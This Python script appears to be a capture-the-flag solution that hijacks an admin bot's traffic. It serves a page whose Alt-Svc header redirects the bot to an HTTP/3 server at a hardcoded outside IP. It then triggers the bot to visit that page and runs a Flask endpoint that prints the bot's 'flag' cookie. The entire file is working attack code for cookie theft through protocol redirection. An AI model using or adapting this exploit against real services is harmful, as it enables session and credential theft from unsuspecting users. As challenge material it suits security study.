import requests
import os
import base64
from flask import Flask, request, redirect

DOMAIN = os.getenv("DOMAIN")

# Cannot use ngrok because it doesn't support UDP
http3_host = "136.243.41.154:443"
print(f"HTTP/3 listening on {http3_host}")

response = requests.post(url=f"https://{DOMAIN}/requestrepo/api/get_token").json()
token = response["token"]
subdomain = response["subdomain"]

response = requests.post(
    url=f"https://{DOMAIN}/requestrepo/api/update_file",
    params={
        "token": token
    },
    headers={
        "Content-Type": "application/json; charset=utf-8",
    },
    json={
        "headers": [
            {
                "value": f'h3="{http3_host}"; ma=15',
                "header": "Alt-Svc"
            },
            {
                "value": "text/html",
                "header": "Content-Type"
            }
        ],
        "raw": base64.b64encode(b"<!DOCTYPE html><script>location.reload();</script>").decode(),
        "status_code": 200
    }
)

requestrepo_url = f"https://{DOMAIN}/requestrepo/{subdomain}"

app = Flask(__name__)

@app.route("/requestrepo/<subdomain>")
def request_repo(subdomain):
    return redirect(f"https://{DOMAIN}/flag/")

@app.route("/flag/")
def flag():
    print(request.cookies["flag"])
    return "ok"

print("Sending bot to", requestrepo_url)
print(requests.post(f"https://{DOMAIN}/app/visit", data={"url": requestrepo_url}).json())

app.run(host="0.0.0.0", port=80)
